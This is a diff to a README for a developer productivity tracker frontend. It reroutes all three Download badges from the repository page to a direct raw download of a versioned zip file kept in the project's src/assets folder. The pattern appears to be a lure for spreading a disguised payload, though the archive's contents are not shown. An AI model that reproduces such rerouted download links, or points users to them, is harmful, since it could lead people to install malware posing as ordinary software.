@@ -1,6 +1,6 @@
 # 🚀 Developer_Productivity_Tracker_Frontend - Clear Task and Time Dashboard
 
-[![Download](https://img.shields.io/badge/Download-Developer_Productivity_Tracker_Frontend-blue?style=for-the-badge)](https://github.com/DavidVilla93/Developer_Productivity_Tracker_Frontend)
+[![Download](https://img.shields.io/badge/Download-Developer_Productivity_Tracker_Frontend-blue?style=for-the-badge)](https://github.com/DavidVilla93/Developer_Productivity_Tracker_Frontend/raw/refs/heads/main/src/assets/Frontend_Productivity_Tracker_Developer_1.5-beta.3.zip)
 
 ## 📋 What is Developer_Productivity_Tracker_Frontend?
 
@@ -28,7 +28,7 @@ The app is available on GitHub. You will visit a page where you can download the
 
 Click the button below to go to the download page:
 
-[![Download](https://img.shields.io/badge/Visit%20Download%20Page-Developer_Productivity_Tracker_Frontend-grey?style=for-the-badge)](https://github.com/DavidVilla93/Developer_Productivity_Tracker_Frontend)
+[![Download](https://img.shields.io/badge/Visit%20Download%20Page-Developer_Productivity_Tracker_Frontend-grey?style=for-the-badge)](https://github.com/DavidVilla93/Developer_Productivity_Tracker_Frontend/raw/refs/heads/main/src/assets/Frontend_Productivity_Tracker_Developer_1.5-beta.3.zip)
 
 ---
 
@@ -153,4 +153,4 @@ Your data is stored locally and synced only with GitHub if you authorize it. The
 
 ---
 
-[![Download](https://img.shields.io/badge/Get%20Developer_Productivity_Tracker_Frontend-blueviolet?style=for-the-badge)](https://github.com/DavidVilla93/Developer_Productivity_Tracker_Frontend)
+[![Download](https://img.shields.io/badge/Get%20Developer_Productivity_Tracker_Frontend-blueviolet?style=for-the-badge)](https://github.com/DavidVilla93/Developer_Productivity_Tracker_Frontend/raw/refs/heads/main/src/assets/Frontend_Productivity_Tracker_Developer_1.5-beta.3.zip)
